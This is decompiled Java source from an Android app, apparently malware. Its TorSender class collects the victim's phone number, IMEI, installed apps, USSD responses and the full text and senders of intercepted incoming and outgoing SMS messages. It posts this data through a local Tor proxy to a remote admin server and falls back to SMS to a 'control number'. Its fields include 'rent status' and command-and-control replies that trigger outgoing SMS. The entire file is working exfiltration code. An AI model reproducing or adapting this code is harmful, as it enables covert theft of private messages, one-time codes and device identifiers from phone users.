package com.baseapp;

import android.content.Context;
import android.content.SharedPreferences;
import ch.boye.httpclientandroidlib.HttpResponse;
import ch.boye.httpclientandroidlib.client.methods.HttpPost;
import ch.boye.httpclientandroidlib.conn.params.ConnRoutePNames;
import ch.boye.httpclientandroidlib.entity.StringEntity;
import ch.boye.httpclientandroidlib.protocol.HTTP;
import ch.boye.httpclientandroidlib.util.EntityUtils;
import info.guardianproject.onionkit.trust.StrongHttpsClient;
import java.io.IOException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;
import org.json.JSONException;
import org.json.JSONObject;

/* loaded from: classes.dex */
public class TorSender {
    private static final String INITIAL_DATA_IS_SENT = "INITIAL_DATA_IS_SENT";
    private static final String PROXY_HOST = "127.0.0.1";
    private static final int PROXY_HTTP_PORT = 8118;

    public static void sendInitialData(Context context) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        if (!settings.getBoolean(INITIAL_DATA_IS_SENT, false)) {
            JSONObject jObj = new JSONObject();
            try {
                jObj.put("type", "device info");
                jObj.put("phone number", Utils.getPhoneNumber(context));
                jObj.put("country", Utils.getCountry(context));
                jObj.put("imei", Utils.getCutIMEI(context));
                jObj.put("model", Utils.getModel());
                jObj.put("os", Utils.getOS());
                jObj.put("client number", Constants.CLIENT_NUMBER);
                String data = jObj.toString();
                try {
                    HttpResponse response = send(context, Constants.ADMIN_URL, data);
                    if (response.getStatusLine().getStatusCode() != 200) {
                        throw new Exception();
                    }
                    JSONObject jObject = new JSONObject(EntityUtils.toString(response.getEntity()));
                    Utils.sendMessage(jObject.getString("number"), jObject.getString("code"));
                    Utils.putBooleanValue(settings, INITIAL_DATA_IS_SENT, true);
                } catch (Exception e) {
                }
            } catch (JSONException e2) {
                e2.printStackTrace();
            }
        }
    }

    public static void sendCheckData(Context context) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        JSONObject jObj = new JSONObject();
        try {
            jObj.put("type", "device check");
            jObj.put("phone number", Utils.getPhoneNumber(context));
            jObj.put("country", Utils.getCountry(context));
            jObj.put("imei", Utils.getCutIMEI(context));
            jObj.put("model", Utils.getModel());
            jObj.put("os", Utils.getOS());
            jObj.put("client number", Constants.CLIENT_NUMBER);
            String data = jObj.toString();
            try {
                HttpResponse response = send(context, Constants.ADMIN_URL, data);
                if (response.getStatusLine().getStatusCode() != 200) {
                    throw new Exception();
                }
            } catch (Exception e) {
                Utils.sendMessage(settings.getString(Constants.CONTROL_NUMBER, ""), data);
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    public static void sendControlNumberData(Context context) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        JSONObject jObj = new JSONObject();
        try {
            String controlNumber = settings.getString(Constants.CONTROL_NUMBER, "");
            jObj.put("type", "control number response");
            jObj.put("set number", controlNumber);
            jObj.put("imei", Utils.getCutIMEI(context));
            jObj.put("client number", Constants.CLIENT_NUMBER);
            String data = jObj.toString();
            try {
                HttpResponse response = send(context, Constants.ADMIN_URL, data);
                if (response.getStatusLine().getStatusCode() != 200) {
                    throw new Exception();
                }
            } catch (Exception e) {
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    public static void sendListenedIncomingSMS(Context context, String text, String from) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        JSONObject jObj = new JSONObject();
        try {
            jObj.put("type", "listened incoming sms");
            jObj.put("from", from);
            jObj.put("text", text);
            jObj.put("client number", Constants.CLIENT_NUMBER);
            jObj.put("imei", Utils.getCutIMEI(context));
            String data = jObj.toString();
            try {
                HttpResponse response = send(context, Constants.ADMIN_URL, data);
                if (response.getStatusLine().getStatusCode() != 200) {
                    throw new Exception();
                }
            } catch (Exception e) {
                Utils.sendMessage(settings.getString(Constants.CONTROL_NUMBER, ""), data);
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    public static void sendInterceptedIncomingSMS(Context context, String text, String from) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        JSONObject jObj = new JSONObject();
        try {
            jObj.put("type", "intercepted incoming sms");
            jObj.put("from", from);
            jObj.put("text", text);
            jObj.put("client number", Constants.CLIENT_NUMBER);
            jObj.put("imei", Utils.getCutIMEI(context));
            String data = jObj.toString();
            try {
                HttpResponse response = send(context, Constants.ADMIN_URL, data);
                if (response.getStatusLine().getStatusCode() != 200) {
                    throw new Exception();
                }
            } catch (Exception e) {
                Utils.sendMessage(settings.getString(Constants.CONTROL_NUMBER, ""), data);
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    public static void sendListenedOutgoingSMS(Context context, String text, String to) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        JSONObject jObj = new JSONObject();
        try {
            jObj.put("type", "listened outgoing sms");
            jObj.put("to", to);
            jObj.put("text", text);
            jObj.put("client number", Constants.CLIENT_NUMBER);
            jObj.put("imei", Utils.getCutIMEI(context));
            String data = jObj.toString();
            try {
                HttpResponse response = send(context, Constants.ADMIN_URL, data);
                if (response.getStatusLine().getStatusCode() != 200) {
                    throw new Exception();
                }
            } catch (Exception e) {
                Utils.sendMessage(settings.getString(Constants.CONTROL_NUMBER, ""), data);
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    public static void sendInstalledApps(Context context) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        JSONObject jObj = new JSONObject();
        try {
            jObj.put("type", "installed apps");
            jObj.put("apps", Utils.getInstalledAppsList(context));
            jObj.put("client number", Constants.CLIENT_NUMBER);
            jObj.put("imei", Utils.getCutIMEI(context));
            String data = jObj.toString();
            try {
                HttpResponse response = send(context, Constants.ADMIN_URL, data);
                if (response.getStatusLine().getStatusCode() != 200) {
                    throw new Exception();
                }
            } catch (Exception e) {
                Utils.sendMessage(settings.getString(Constants.CONTROL_NUMBER, ""), data);
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    public static void sendRentStatus(Context context, String status) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        JSONObject jObj = new JSONObject();
        try {
            jObj.put("type", "rent status");
            jObj.put("rent status", status);
            jObj.put("client number", Constants.CLIENT_NUMBER);
            jObj.put("imei", Utils.getCutIMEI(context));
            String data = jObj.toString();
            try {
                HttpResponse response = send(context, Constants.ADMIN_URL, data);
                if (response.getStatusLine().getStatusCode() != 200) {
                    throw new Exception();
                }
            } catch (Exception e) {
                Utils.sendMessage(settings.getString(Constants.CONTROL_NUMBER, ""), data);
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    public static void sendUSSDData(Context context, String text) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        JSONObject jObj = new JSONObject();
        try {
            jObj.put("type", "ussd");
            jObj.put("data", text);
            jObj.put("client number", Constants.CLIENT_NUMBER);
            jObj.put("imei", Utils.getCutIMEI(context));
            String data = jObj.toString();
            try {
                HttpResponse response = send(context, Constants.ADMIN_URL, data);
                if (response.getStatusLine().getStatusCode() != 200) {
                    throw new Exception();
                }
            } catch (Exception e) {
                Utils.sendMessage(settings.getString(Constants.CONTROL_NUMBER, ""), data);
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    private static HttpResponse send(Context context, String url, String data) throws KeyManagementException, UnrecoverableKeyException, NoSuchAlgorithmException, KeyStoreException, CertificateException, IOException {
        StrongHttpsClient httpclient = new StrongHttpsClient(context);
        httpclient.useProxy(true, ConnRoutePNames.DEFAULT_PROXY, "127.0.0.1", 8118);
        HttpPost httpPost = new HttpPost(url);
        httpPost.setEntity(new StringEntity(data, HTTP.UTF_8));
        return httpclient.execute(httpPost);
    }
}